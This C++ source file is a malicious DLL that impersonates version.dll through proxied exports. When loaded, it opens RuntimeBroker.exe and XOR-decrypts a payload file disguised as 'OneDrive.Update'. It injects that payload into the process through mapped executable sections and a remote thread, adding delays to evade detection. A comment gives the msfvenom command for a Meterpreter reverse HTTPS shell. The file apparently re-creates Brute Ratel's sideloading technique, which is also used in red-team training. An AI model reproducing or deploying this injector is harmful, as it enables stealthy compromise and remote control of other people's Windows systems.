
#include "pch.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <stdlib.h>
#include "CreateSection.h"
#pragma comment(lib, "ntdll")

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:GetFileVersionInfoA=vresion.GetFileVersionInfoA,@1")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=vresion.GetFileVersionInfoByHandle,@2")
#pragma comment(linker, "/export:GetFileVersionInfoExA=vresion.GetFileVersionInfoExA,@3")
#pragma comment(linker, "/export:GetFileVersionInfoExW=vresion.GetFileVersionInfoExW,@4")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=vresion.GetFileVersionInfoSizeA,@5")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=vresion.GetFileVersionInfoSizeExA,@6")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=vresion.GetFileVersionInfoSizeExW,@7")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=vresion.GetFileVersionInfoSizeW,@8")
#pragma comment(linker, "/export:GetFileVersionInfoW=vresion.GetFileVersionInfoW,@9")
#pragma comment(linker, "/export:VerFindFileA=vresion.VerFindFileA,@10")
#pragma comment(linker, "/export:VerFindFileW=vresion.VerFindFileW,@11")
#pragma comment(linker, "/export:VerInstallFileA=vresion.VerInstallFileA,@12")
#pragma comment(linker, "/export:VerInstallFileW=vresion.VerInstallFileW,@13")
#pragma comment(linker, "/export:VerLanguageNameA=vresion.VerLanguageNameA,@14")
#pragma comment(linker, "/export:VerLanguageNameW=vresion.VerLanguageNameW,@15")
#pragma comment(linker, "/export:VerQueryValueA=vresion.VerQueryValueA,@16")
#pragma comment(linker, "/export:VerQueryValueW=vresion.VerQueryValueW,@17")

// All credits to https://github.com/peperunas/injectopi/blob/master/CreateSection/CreateSection.cpp
// and https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/#Modification-of-Versiondll

BOOL LoadNtdllFunctions() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    ZwOpenProcess = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))GetProcAddress(ntdll, "ZwOpenProcess");
    if (ZwOpenProcess == NULL) return FALSE;

    ZwCreateSection = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))
        GetProcAddress(ntdll, "ZwCreateSection");
    if (ZwCreateSection == NULL) return FALSE;

    NtMapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG))
        GetProcAddress(ntdll, "NtMapViewOfSection");
    if (NtMapViewOfSection == NULL) return FALSE;

    ZwCreateThreadEx = (NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID))
        GetProcAddress(ntdll, "ZwCreateThreadEx");
    if (ZwCreateThreadEx == NULL) return FALSE;

    NtDelayExecution = (NTSTATUS(NTAPI*)(BOOL, PLARGE_INTEGER))GetProcAddress(ntdll, "NtDelayExecution");
    if (NtDelayExecution == NULL) return FALSE;


    ZwClose = (NTSTATUS(NTAPI*)(HANDLE))GetProcAddress(ntdll, "ZwClose");
    if (ZwClose == NULL) return FALSE;

    return TRUE;
}

HANDLE getProcHandlebyName(const char* procName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    NTSTATUS status = NULL;
    HANDLE hProc = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp((entry.szExeFile), procName) == 0) {
                OBJECT_ATTRIBUTES oa;
                CLIENT_ID cid = { (HANDLE)entry.th32ProcessID, NULL };
                InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
                // 3. Call the Windows API ntdll ZwOpenProcess using the process ID from step 1. The process is opened with full control access.
                status = ZwOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);

                if (!NT_SUCCESS(status)) {
                    continue;
                }
                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }
    ZwClose(snapshot);

    return NULL; 
}

// credit: Sektor7 RTO Malware Essential Course 
void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j;

    j = 0;
    for (int i = 0; i < data_len; i++) {
        if (j == key_len - 1) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}


DWORD WINAPI DoMagic(LPVOID lpParameter)
{
    if (LoadNtdllFunctions() == FALSE) {
        printf("[-] Failed to load NTDLL function\n");
        return -1;
    }

    // 1. Enumerate all process and locate process for RuntimeBroker.exe 
    // https://stackoverflow.com/questions/865152/how-can-i-get-a-process-handle-by-its-name-in-c
    HANDLE hProc = getProcHandlebyName("RuntimeBroker.exe");
    if (hProc == NULL) {
        exit(0);
    }

    // 2. Read the payload file OneDrive.Update from the current working directory.
    // msfvenom -p windows/x64/meterpreter/reverse_https lhost=<ip> lport=<port> f raw -o /root/attack/OneDrive.Update exitfunc=thread --encrypt xor --encrypt-key "jikoewarfkmzsdlhfnuiwaejrpaw" exitfunc=thread
    FILE* fp;
    size_t shellcodeSize;
    unsigned char* shellcode;
    fp = fopen("OneDrive.Update", "rb");
    fseek(fp, 0, SEEK_END);
    shellcodeSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    shellcode = (unsigned char*)malloc(shellcodeSize);
    fread(shellcode, shellcodeSize, 1, fp);

    char key[] = "jikoewarfkmzsdlhfnuiwaejrpaw";

    // 4. Decrypt the payload file using the XOR encryption algorithm with a 28-byte key of: jikoewarfkmzsdlhfnuiwaejrpaw
    XOR((char*)shellcode, shellcodeSize, key, sizeof(key));

    HANDLE hSection = NULL;
    NTSTATUS status = NULL;
    SIZE_T size = 4096;
    LARGE_INTEGER sectionSize = { size };
    PVOID pLocalView = NULL, pRemoteView = NULL;
    SIZE_T scLength = sizeof(shellcode);
    int viewUnMap = 2;

    // 5. Call the Windows API NtCreateSection, which creates a block of memory that can be shared between processes.
    if ((status = ZwCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS) {
        return -1;
    }

    // 6. Two calls into the Windows API NtMapViewOfSection. The first call maps the contents of the decrypted payload into the current process memory space.
    if ((status = NtMapViewOfSection(hSection, GetCurrentProcess(),
        &pLocalView, NULL, NULL, NULL,
        &size, viewUnMap, NULL, PAGE_READWRITE)) != STATUS_SUCCESS) {
        return -1;
    }

    // Use for in-file shellcode 
    //memcpy(pLocalView, shellcode, sizeof(shellcode));

    // Use for on-disk shellcode 
    memcpy(pLocalView, shellcode, shellcodeSize);

    // 6. Second call maps the contents into the Runtimebroker.exe memory space.
    if ((status = NtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL,
        &size, viewUnMap, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS) {
        return -1;
    }

    // 7. Calls the Windows API NtDelayExecution and sleeps (pauses execution) for ~4.27 seconds
    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (int)(4270 * 10000.0f);
    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS) {
        printf("[-] Cannot delay execution. Error code: %08X\n", status);
        return -1;
    }
     
    // 8. Call the Windows API NtCreateThreadEx.
    HANDLE hThread = NULL;
    if ((status = ZwCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, pRemoteView, NULL, CREATE_SUSPENDED, 0, 0, 0, 0)) != STATUS_SUCCESS) {
        return -1;
    }
    
    ResumeThread(hThread);

    // 9. Calls the Windows API NtDelayExecution and sleeps (pauses execution) for ~4.27 seconds
    interval.QuadPart = -1 * (int)(4270 * 10000.0f);
    if ((status = NtDelayExecution(TRUE, &interval)) != STATUS_SUCCESS) {
        printf("[-] Cannot delay execution. Error code: %08X\n", status);
        return -1;
    }
    
    // 10. Finished. 
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // https://gist.github.com/securitytube/c956348435cc90b8e1f7
        // Create a thread and close the handle as we do not want to use it to wait for it 
        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        Sleep(5000);
        break;
    }
    return TRUE;
}